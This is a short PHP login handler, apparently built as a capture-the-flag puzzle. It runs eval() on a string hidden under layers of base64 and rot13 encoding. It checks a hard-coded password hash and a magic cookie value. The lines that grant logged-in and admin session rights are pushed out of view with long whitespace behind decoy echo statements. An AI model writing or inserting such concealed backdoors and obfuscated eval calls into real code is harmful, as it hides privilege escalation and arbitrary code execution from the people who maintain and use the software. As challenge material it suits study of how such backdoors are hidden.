<?php
    require_once('config.php');

    # https://www.youtube.com/watch?v=LJ5nV9aKthU
    if (isset($_GET['username']) && isset($_GET['password']) && isset($_COOKIE['LET_ME_IN'])) {

        # Fuck thats some ugly code... I don't know what it does so I left it here
        $x = "lol :)";
        eval(str_rot13(base64_decode(str_rot13(base64_decode('V1RmdENGTnhLMUVGRTFmdm5UTWxNSlNocmFWdktGT3JWUFdLTVF5aFpHQU1aR0hiWHZWNw==')))));
        if ( $x == '9BZ3TGxuXAd'
            && md5($_GET/*DS noi poiobefihsdoipfpughy0923hrboupi 9ghiosud */['password']/*fhds */) == '2ab96390c7dbe3439de74d0c9b0b1767'                                                                                                                                      && $_COOKIE['LET_ME_IN'] == "The magic word is PLEASE"
) {
                echo "I'm just a normal line of code :)" . "\n";                                                                                                                                                                                                                                                                                                                                            $_SESSION['loggedin'] = true;
                echo "Please don't remove me :)" . "\n";                                                                                                                                                                                                                                                                                                                                                            $_SESSION['admin'] = true;
        } else {
            echo "nope";
        }
    } else {
        echo ".";
    }
?>